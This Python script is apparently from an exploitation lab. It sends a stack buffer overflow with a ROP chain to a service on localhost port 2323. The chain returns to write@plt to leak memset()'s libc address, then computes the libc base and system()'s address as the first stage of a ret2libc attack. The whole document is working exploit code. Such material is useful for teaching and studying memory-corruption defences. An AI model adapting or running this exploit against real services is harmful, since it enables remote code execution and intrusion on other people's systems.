#!/usr/bin/env python

from socket import *
from struct import *

write_plt  = 0x401080           # address of write@plt
memset_got = 0x404030           # memset()'s GOT entry
pop3ret    = 0x4011be           # gadget to pop rdi; pop rsi; pop rdx; ret
memset_off = 0x0a36f0           # memset()'s offset in libc.so.6
system_off = 0x0554e0           # system()'s offset in libc.so.6

buf = ""
buf += "A"*168                  # padding to RIP's offset
buf += pack("<Q", pop3ret)      # pop args into registers
buf += pack("<Q", 0x1)          # stdout
buf += pack("<Q", memset_got)   # address to read from
buf += pack("<Q", 0x8)          # number of bytes to write to stdout
buf += pack("<Q", write_plt)    # return to write@plt

print(buf)

s = socket(AF_INET, SOCK_STREAM)
s.connect(("127.0.0.1", 2323))

print(s.recv(1024))             # "Enter input" prompt
s.send(buf + "\n")              # send buf to overwrite RIP
reply = s.recv(1024)            # receive server reply
print(reply)
d = reply[-8:]                  # we returned to write@plt, so receive the leaked memset() libc address which is the last 8 bytes in the reply

memset_addr = unpack("<Q", d)
print("memset() is at " + hex(memset_addr[0]))
libc_base = memset_addr[0] - memset_off
print("libc base address is " + hex(libc_base))
system_addr = libc_base + system_off
print("system() is at " + hex(system_addr))

# keep socket open so gdb doesn't get a SIGTERM
# while True:
    # s.recv(1024)
